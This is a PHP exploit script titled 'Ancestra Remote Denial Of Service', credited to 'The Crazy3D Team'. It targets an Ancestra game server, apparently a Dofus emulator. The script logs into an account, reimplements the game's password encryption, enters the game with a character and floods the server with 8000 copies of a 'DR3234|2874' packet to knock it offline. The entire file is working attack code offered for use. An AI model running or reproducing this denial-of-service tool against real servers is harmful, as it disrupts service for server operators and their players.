<?php
// NOTE : If you are using BHR put this file in \exploits\dofus\
// BHR 3 Download link : http://www.mediafire.com/?h0c5i3gqzbql345
error_reporting(0);
ini_set("default_socket_timeout", 1);
/*
!Ancestra_DOS
@HOST = 127.0.0.1 = Target HOST
@PORT = 2020 = Target PORT
@VERSION = 1.29.1 = Game Version
@SERVID = 1 = Game Server ID
*/
$host = $argv[1];
$port = $argv[2];
$version = $argv[3];
$sid = $argv[4];
    function CryptPass($pass,$key)
    {
         $hash = array ("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "-", "_");
         $l1 = $l2= $l3= $l4= $l5=0 ; 
         $v1 = $v2 = "";
         $l7 = "#1";
         for ($l1 = 0; $l1<= strlen($pass)-1; $l1++)
           {
            $l2 = ord(substr($pass,$l1,1));
            $l3 = ord(substr($key,$l1,1));
            $l5 = ($l2/16);
            $l4 = ($l2 % 16);
            $v1 = $hash[(($l5+$l3) % (count($hash))) % (count($hash))];
            $v2 = $hash[(($l4+$l3) % (count($hash))) % (count($hash))];
            $l7 = $l7.$v1.$v2;
           }
          return $l7."\n";
    }   
print "\n+-----------------------[ The Crazy3D Team ]--------------------------+";
print "\n| Ancestra Remote Denial Of Service                                   |";
print "\n|                                by The UnKn0wN                       |";
print "\n|     Greets to : The Crazy3D Team and all Algerian h4x0rs            |";
print "\n+---------------------------------------------------------------------+";
print "\n|                       www.rpg-exploit.com                           |";
print "\n+---------------------------------------------------------------------+\n";
  do
  {
    print "\n-------------------------[ ACCOUNT CONFIG ]----------------------------";
    print "\n[*] Username : ";
    $acc1 = trim(fgets(STDIN));
    print "\n[*] Password : ";
    $pass1 = trim(fgets(STDIN));
    }while($acc1 == "" && $pass1 == "");
    print "\n------------------------[ EXPLOIT  STARTED ]---------------------------\n";
    print"[*] Connecting to the login server\n";
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
     
    socket_connect($sock,$host,$port) or die("[-] Cannot connect to the login server \n");
      $rec ="";
      socket_recv($sock,$rec,2048,MSG_WAITALL);
    $key = $rec;
    print"[+] Connected to the login server\n";
socket_write($sock,$version.chr(10).chr(0).$acc1.chr(10).CryptPass($pass1,substr($key,2)).chr(10).chr(0)."Af".chr(10).chr(0));
socket_recv($sock,$rec,2048,MSG_WAITALL);
$rec = substr($rec,0,4);
switch ($rec)
{
 case "AlEf" :
  die("[-] Wrong Username/Password\n");
 break;
  
 case "AlEb" :
  
 die("[-] Banned Account\n");
 break;
  
 case "AlEk" :
  
 die("[-] Banned Account(temporary)\n");
 break;
  
 case "AlEv" :
  
 die("[-] Wrong Version\n");
 break;
}
socket_write($sock,"Ax".chr(10).chr(0));
socket_recv($sock,$rec,2048,MSG_WAITALL);
print"[*] Getting Game server Infos ...\n";
socket_write($sock,"AX".$sid.chr(10).chr(0));
socket_recv($sock,$rec,2048,MSG_WAITALL);
socket_recv($sock,$rec,2048,MSG_WAITALL);
$servinfos = split(";",$rec);
$gameinfo = str_replace("AYK","",$servinfos[0]);
$ghost = split(":",$gameinfo);
print"[*] Connecting to the Game Server\n";
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($socket,$ghost[0],$ghost[1]) or die("[-] Cannot connect to the game server \n");
print"[+] Connected to the Game Server\n";
socket_recv($socket,$rec,2048,MSG_WAITALL);
socket_write($socket,"AT".$servinfos[1].chr(10).chr(0));
socket_recv($socket,$rec,2048,MSG_WAITALL);
socket_write($socket,"Ak0".chr(10).chr(0)."AV".chr(10).chr(0));
socket_recv($socket,$rec,2048,MSG_WAITALL);
socket_write($socket,"Agfr".chr(10).chr(0)."AL".chr(10).chr(0)."Af".chr(10).chr(0));
socket_recv($socket,$rec,2048,MSG_WAITALL);
print"[*] Getting Characters infos\n";
$data = split(";",$rec);
$charid = split("\|",$data[0]);
socket_write($socket,"AS".$charid[2].chr(10).chr(0));
socket_recv($socket,$rec,2048,MSG_WAITALL);
socket_recv($socket,$rec,2048,MSG_WAITALL);
socket_recv($socket,$rec,2048,MSG_WAITALL);
socket_write($socket,"CG1".chr(10).chr(0));
print "\n------------------------[ CONNECTED INGAME ]---------------------------\n";
for ($i =1; $i<14; $i++)
{
socket_recv($socket,$rec,2048,MSG_WAITALL);
if (substr($rec,0,2) == "cs")
 {
   print ("\n[*] Welcome Message : ".strip_tags(substr($rec,2))."\n");
 }
}
socket_write($socket,"BD".chr(10).chr(0));
socket_recv($socket,$rec,2048,MSG_WAITALL);
socket_recv($socket,$rec,2048,MSG_WAITALL);
socket_write($socket,"GI".chr(10).chr(0));
socket_recv($socket,$rec,2048,MSG_WAITALL);
socket_recv($socket,$rec,2048,MSG_WAITALL);
socket_recv($socket,$rec,2048,MSG_WAITALL);
print ("[*] Waiting 5 secondes");sleep(5);
print "\n---------------------------[ PROCESSING ]------------------------------\n";
$ev = "DR3234|2874";
for ($i =1; $i<=8000; $i++)
{
 print "[+] Sending ".strlen($ev)." Bytes packet (".$i."/8000) \n";
 socket_write($socket,$ev.chr(10).chr(0));
 socket_recv($socket,$rec,2048,MSG_WAITALL);
 socket_recv($socket,$rec,2048,MSG_WAITALL);
 socket_recv($socket,$rec,2048,MSG_WAITALL);
 socket_recv($socket,$rec,2048,MSG_WAITALL);
 socket_recv($socket,$rec,2048,MSG_WAITALL);
}
print "\n------------------------------[ DONE ]---------------------------------\n";
print "[+] Exploit Finished, please check if the server is down\n";